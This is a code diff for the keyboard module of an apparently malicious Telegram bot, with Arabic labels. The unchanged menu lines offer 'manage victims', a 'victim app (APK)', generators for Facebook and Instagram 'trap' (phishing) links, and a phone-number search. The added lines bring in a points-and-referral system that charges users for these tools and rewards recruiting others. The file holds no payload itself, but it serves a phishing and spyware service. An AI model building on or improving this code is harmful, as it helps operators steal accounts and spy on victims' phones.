@@ -1,18 +1,35 @@
 # bot_handlers/keyboards.py
 # ============================================================
-# كل الـ Keyboards
+# كل الـ Keyboards — v2 مع نظام النقاط
 # ============================================================
 
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-from imports_manager import is_admin
+from imports_manager import (
+    is_admin,
+    POINTS_SYSTEM_ENABLED,
+    TOOL_PRICES,
+    build_main_menu_keyboard as build_points_main_menu,
+)
 from .templates import FACEBOOK_SITES, INSTAGRAM_SITES
 
 
 # ══════════════════════════════════════════════════
-# Main Menu
+# Main Menu — يعتمد على نظام النقاط
 # ══════════════════════════════════════════════════
 def main_menu(user_id=None):
+    """القائمة الرئيسية — نظام النقاط"""
+    # جرّب القائمة الجديدة
+    if user_id and POINTS_SYSTEM_ENABLED:
+        try:
+            return build_points_main_menu(user_id)
+        except Exception as e:
+            # Fallback للقائمة القديمة
+            from logging_config import get_logger
+            logger = get_logger("bot_handlers.keyboards")
+            logger.warning(f"build_points_main_menu failed: {e}")
+
+    # ─── Fallback: القائمة القديمة ───
     markup = InlineKeyboardMarkup()
     markup.add(InlineKeyboardButton("👥 إدارة الضحايا", callback_data="v_list"))
     markup.add(InlineKeyboardButton("📱 تطبيق الضحية (APK)", callback_data="v_new"))
@@ -23,7 +40,7 @@ def main_menu(user_id=None):
     markup.add(InlineKeyboardButton("🔗 توليد رابط مصيدة فيسبوك", callback_data="gen_fb"))
     markup.add(InlineKeyboardButton("📸 توليد رابط مصيدة انستقرام", callback_data="gen_ig"))
     markup.add(InlineKeyboardButton("📖 شرح البوت", callback_data="help_guide"))
-    markup.add(InlineKeyboardButton("💎 الاشتراكات والدفع", callback_data="payment_menu"))
+    markup.add(InlineKeyboardButton("💰 نقاطي والإحالات", callback_data="points_menu"))
     markup.add(InlineKeyboardButton("👤 حسابي", callback_data="my_account"))
 
     if user_id and is_admin(user_id):
@@ -44,6 +61,8 @@ def main_menu_text(user_id=None):
     return (
         "⚡ <b>القائمة الرئيسية</b>\n"
         "━━━━━━━━━━━━━━━━━━\n\n"
+        "💰 <i>استخدم النقاط لفتح الأدوات</i>\n"
+        "🎁 <i>اجمع نقاط بالإحالات</i>\n\n"
         "🎯 اختر أداة:"
     )
 
@@ -53,7 +72,7 @@ def main_menu_text(user_id=None):
 # ══════════════════════════════════════════════════
 def build_search_menu():
     m = InlineKeyboardMarkup()
-    m.add(InlineKeyboardButton("📱 بحث برقم الهاتف ✨", callback_data="search_phone"))
+    m.add(InlineKeyboardButton("📱 بحث برقم الهاتف ✨ (5 نقاط)", callback_data="search_phone"))
     m.add(InlineKeyboardButton("📧 بحث بالإيميل 🔒", callback_data="search_email_soon"))
     m.add(InlineKeyboardButton("👤 بحث باسم المستخدم 🔒", callback_data="search_username_soon"))
     m.add(InlineKeyboardButton("📘 بحث بفيسبوك 🔒", callback_data="search_fb_soon"))
@@ -211,4 +230,18 @@ def build_update_panel():
         InlineKeyboardButton("⚙️ إعدادات", callback_data="upd_settings"),
     )
     m.add(InlineKeyboardButton("🔙 رجوع للأدمن", callback_data="admin_panel"))
+    return m
+
+
+# ══════════════════════════════════════════════════
+# Points Menu (جديد)
+# ══════════════════════════════════════════════════
+def build_points_menu():
+    """لوحة النقاط والإحالات"""
+    m = InlineKeyboardMarkup()
+    m.add(InlineKeyboardButton("🔗 رابط الإحالة الخاص بي", callback_data="my_referral_link"))
+    m.add(InlineKeyboardButton("📊 سجل المعاملات", callback_data="points_history"))
+    m.add(InlineKeyboardButton("👥 قائمة إحالاتي", callback_data="my_referrals"))
+    m.add(InlineKeyboardButton("💎 كيف أكسب نقاط؟", callback_data="how_to_earn"))
+    m.add(InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="back_to_main"))
     return m
